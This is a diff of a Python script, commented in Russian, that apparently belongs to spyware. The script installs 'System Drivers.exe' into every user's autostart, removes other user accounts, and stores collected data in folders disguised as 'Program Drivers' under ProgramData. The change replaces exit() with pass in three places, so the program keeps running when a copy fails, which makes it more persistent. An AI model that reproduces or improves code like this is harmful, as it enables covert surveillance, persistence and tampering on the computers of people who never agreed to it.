@@ -199,6 +199,8 @@ add_auto_for_users = lambda user: copy('System Drivers.exe', 'C:\\Users\\' + use
 for user in others_users: remove_others_users(user)
 #Добавление в автозагрузку
 for user in all_users: add_auto_for_users(user)
+#
+
 #Главная директрия
 main_folder = "ProgramData\\Program Drivers\\"
 #Дополнительная директрия, если к первой доступ отсутсвует
@@ -256,7 +258,7 @@ try:
 		try: 
 			copy("data.dat", disk_key + main_folder)
 		except:
-			exit()
+			pass
 	if not isdir(disk_key + main_folder + user_name): mkdir(disk_key + main_folder + user_name)
 	if not isdir(disk_key + main_folder + user_name + '\\' + year_curent): mkdir(disk_key + main_folder + user_name + '\\' + year_curent)
 	if not isdir(disk_key + main_folder + user_name + '\\' + year_curent + '\\' + moon_curent): mkdir(disk_key + main_folder + user_name + '\\' + year_curent + '\\' + moon_curent)
@@ -271,7 +273,7 @@ except:
 			try:
 				copy("data.dat", disk_key + dop_folder)
 			except:
-				exit()
+				pass
 		if not isdir(disk_key + dop_folder + user_name): mkdir(disk_key + dop_folder + user_name)
 		if not isdir(disk_key + dop_folder + user_name + '\\' + moon_curent): mkdir(disk_key + dop_folder + user_name + '\\' + moon_curent)
 		if not isdir(disk_key + dop_folder + user_name + '\\' + year_curent + '\\' + moon_curent): mkdir(disk_key + dop_folder + user_name + '\\' + year_curent + '\\' + moon_curent)
@@ -289,7 +291,7 @@ except:
 				try:
 					copy("data.dat", disk_key + folder_for_D)
 				except:
-					exit()
+					pass
 			if not isdir(disk_key + folder_for_D + user_name + '\\' + moon_curent): mkdir(disk_key + folder_for_D + user_name + '\\' + moon_curent)
 			if not isdir(disk_key + folder_for_D + user_name + '\\' + year_curent + '\\' + moon_curent): mkdir(disk_key + folder_for_D + user_name + '\\' + year_curent + '\\' + moon_curent)
 			main_folder = folder_for_D
